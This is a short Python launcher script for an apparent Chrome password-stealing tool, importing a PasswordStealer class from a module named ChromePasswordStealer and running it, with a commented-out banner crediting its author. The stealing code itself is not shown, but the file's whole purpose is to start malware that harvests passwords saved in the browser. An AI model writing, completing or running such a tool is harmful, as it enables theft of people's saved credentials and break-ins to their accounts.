from ChromePasswordStealer import PasswordStealer
from utils import Utils as ul

def main():
    # title = ul.CreateAsciiText("Password Stealer")
    
    # print(f"{title}\n© Credit To Av1v ® All rights reserved\n")

    chrome_password_stealer = PasswordStealer()
    chrome_password_stealer.run()

    input("\nPress any key to exit: ")

if __name__ == "__main__":
    main()